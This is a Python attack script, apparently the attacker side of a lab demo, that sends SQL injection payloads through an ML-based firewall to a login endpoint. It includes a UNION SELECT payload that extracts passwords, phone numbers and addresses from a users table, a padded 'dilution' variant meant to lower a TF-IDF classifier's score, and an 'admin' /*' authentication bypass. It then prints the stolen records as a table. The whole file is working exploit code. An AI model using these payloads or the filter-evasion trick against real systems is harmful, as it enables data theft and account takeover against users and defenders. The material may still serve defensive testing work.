import requests
import json
import sys
import time
import argparse

# Configuration
# Default target is Firewall (on Defense machine)
DEFAULT_TARGET = "http://10.0.0.10:5001/filter"
DIRECT_TARGET = "http://10.0.0.20:5002/login"

HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'

def print_step(msg):
    print(f"{HEADER}[*] {msg}{ENDC}")

def print_success(msg):
    print(f"{OKGREEN}[+] {msg}{ENDC}")

def print_fail(msg):
    print(f"{FAIL}[!] {msg}{ENDC}")

def run_exploit(target_url, mode='firewall'):
    print(f"{BOLD}=================================================={ENDC}")
    print(f"{BOLD}   DATA EXTRACTION DEMO - SQL INJECTION EXPLOIT   {ENDC}")
    print(f"{BOLD}=================================================={ENDC}\n")
    print(f"Target: {target_url} ({mode.upper()} MODE)")
    
    # 0. Clear Firewall Rules (only if attacking firewall and user wants clean slate)
    # logic removed from auto-run to allow feedback loop demonstration
    # User should run reset.py manually if they want a clean slate.
    
    # List of payloads to try (progressive obfuscation)
    # Query returns: id, username, email, role (4 columns)
    # We inject: 1, username, password||'|'||phone||'|'||address, role
    payloads = [
        # 1. Standard PII Extraction (password + phone + address concatenated)
        "' UNION SELECT 1, username, password || ' | ' || phone || ' | ' || address, role FROM users--",
        
        # 2. Dilution Attack (Add noise to lower TF-IDF score)
        "' UNION SELECT 1,username,password || ' | ' || phone || ' | ' || address,role FROM users -- " + (" order products details review " * 100),
        
        # 3. Admin Takeover (Obfuscated comment style)
        "admin' /*"
    ]
    
    print_step("Attempting to bypass Adaptive Defense System...\n")
    
    success_achieved = False
    
    for i, payload in enumerate(payloads):
        print(f"{BOLD}[Attempt {i+1}]{ENDC} Payload: {payload[:40]}... (Total Len: {len(payload)})")
        
        try:
            start_time = time.time()
            
            # Request Logic based on Mode
            if mode == 'firewall':
                response = requests.post(target_url, json={'payload': payload}, timeout=5)
            else:
                # Direct Webapp Attack (Login Endpoint)
                # Webapp expects username/password
                response = requests.post(target_url, json={'username': payload, 'password': 'x'}, timeout=5)
                
            elapsed = time.time() - start_time
            
            if response.status_code != 200:
                print_fail(f"HTTP Error: {response.status_code}")
                continue

            data = response.json()
            
            # Response Parsing Logic based on Mode
            webapp_res = {}
            if mode == 'firewall':
                action = data.get('action')
                if action == 'BLOCKED':
                    blocked_by = data.get('blocked_by')
                    conf = data.get('confidence', 'N/A')
                    print_fail(f"   -> BLOCKED by {blocked_by} (Confidence: {conf})")
                    continue
                
                print_success(f"   -> BYPASS SUCCESSFUL! ({elapsed:.2f}s)")
                webapp_res = data.get('webapp_response') or data.get('target_response', {})
            else:
                # Direct Mode: Check directly for success
                print_success(f"   -> Request Sent! ({elapsed:.2f}s)")
                webapp_res = data

            # Verify Compromise
            if webapp_res.get('success'):
                user_role = webapp_res.get('user', {}).get('role')
                print_success(f"Target Compromised! Access Granted as {user_role}.")
                
                resp_data = webapp_res.get('data')
                
                if isinstance(resp_data, list):
                    print(f"\n{BOLD}--- DUMPING STOLEN DATABASE (PII EXFILTRATION) ---{ENDC}")
                    print(f"{'USERNAME':<15} | {'PASSWORD':<12} | {'PHONE':<15} | {'ADDRESS':<40}")
                    print("-" * 90)
                    for user in resp_data:
                        username = user.get('username', 'N/A')
                        # email field contains: password | phone | address (concatenated by SQL injection)
                        raw_data = user.get('email', '|||')
                        parts = raw_data.split(' | ') if raw_data else ['N/A', 'N/A', 'N/A']
                        password = parts[0] if len(parts) > 0 else 'N/A'
                        phone = parts[1] if len(parts) > 1 else 'N/A'
                        address = parts[2] if len(parts) > 2 else 'N/A'
                        role = user.get('role', 'N/A')
                        if str(username) == '1': continue  # Skip dummy row
                        print(f"{username:<15} | {password:<12} | {phone:<15} | {address[:38]:<40}")
                    print("-" * 90)
                    print(f"\n{OKGREEN}Total records stolen: {len(resp_data)} (with full PII data){ENDC}")
                else:
                    u = webapp_res.get('user', {})
                    print(f"\n{BOLD}--- ADMIN ACCOUNT TAKEOVER ---{ENDC}")
                    print(f"Logged in as: {u.get('username')}")
                    print(f"Role: {u.get('role')}")
                    print(f"Email: {u.get('email')}")
                    
                success_achieved = True
                break
            else:
                print_fail("   -> Webapp rejected the payload (Login Failed).")
                if 'error' in webapp_res:
                    print(f"      Error: {webapp_res['error']}")
                
        except Exception as e:
            print_fail(f"Error: {e}")
            
    if not success_achieved:
        print(f"\n{FAIL}{BOLD}[-] All exploits failed.{ENDC}")

if __name__ == "__main__":
    # Always attack through Firewall (Defense machine)
    # Firewall will forward to Webapp if request is allowed
    print("\n[INFO] All attacks go through Firewall (10.0.0.10:5001)")
    print("[INFO] Firewall forwards to Webapp (10.0.0.20:5002) if allowed\n")
    run_exploit(DEFAULT_TARGET, mode='firewall')